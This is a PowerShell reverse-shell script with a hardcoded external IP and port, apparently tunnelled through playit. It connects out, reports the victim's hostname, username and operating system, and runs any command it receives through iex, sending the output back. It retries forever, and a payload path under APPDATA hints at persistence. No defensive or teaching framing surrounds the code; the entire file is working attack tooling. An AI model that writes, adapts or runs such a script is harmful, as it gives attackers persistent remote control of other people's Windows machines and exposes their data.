# reverse_shell.ps1 - EXACTLY FOR YOUR PLAYIT TUNNEL
$playitAddress = "147.185.221.31"  # YOUR EXACT ADDRESS
$playitPort = 47034  # YOUR EXACT PORT
$reconnectDelay = 15  # Seconds to wait before reconnecting
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

# CRITICAL: Disable PowerShell formatting for clean output
$FormatEnumerationLimit = -1
$PSStyle.OutputRendering = 'PlainText'

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

# Main persistent loop (NEVER EXITS)
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($playitAddress, $playitPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info
        $writer.WriteLine((Get-SystemInfo))
        
        # Command execution loop (NEVER EXITS ON ERROR)
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }  # Server closed connection
                
                if ($command -eq "exit") { break }
                
                # Execute command and send result (as plain text)
                $result = iex $command 2>&1 | Out-String
                
                # CRITICAL: Fix line endings for Linux
                $result = $result -replace "`r`n", "`n"
                
                $writer.Write($result)
            }
            catch {
                # Send error but KEEP CONNECTION ALIVE
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.Write($errorOutput)
            }
        }
    }
    catch {
        # Connection failed, but we'll retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
